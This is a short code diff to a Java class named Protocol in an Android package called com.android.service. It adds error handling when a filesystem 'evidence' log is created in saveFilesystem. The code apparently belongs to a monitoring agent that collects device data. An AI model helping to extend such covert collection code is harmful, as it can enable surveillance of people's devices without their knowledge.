@@ -32,9 +32,8 @@ import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
-// TODO: Auto-generated Javadoc
 /**
- * The Class Protocol.
+ * The Class Protocol, is extended by ZProtocol
  */
 public abstract class Protocol {
 
@@ -250,7 +249,10 @@ public abstract class Protocol {
 	 */
 	public static void saveFilesystem(final int depth, String path) {
 		final Evidence fsLog = new Evidence(EvidenceType.FILESYSTEM);
-		fsLog.createEvidence(null, EvidenceType.FILESYSTEM);
+		if(!fsLog.createEvidence(null, EvidenceType.FILESYSTEM)){
+			Log.d("QZ", TAG + " (saveFilesystem) Error: cannot create evidence");
+			return;
+		}
 
 		// Expand path and create log
 		if (path.equals("/")) {
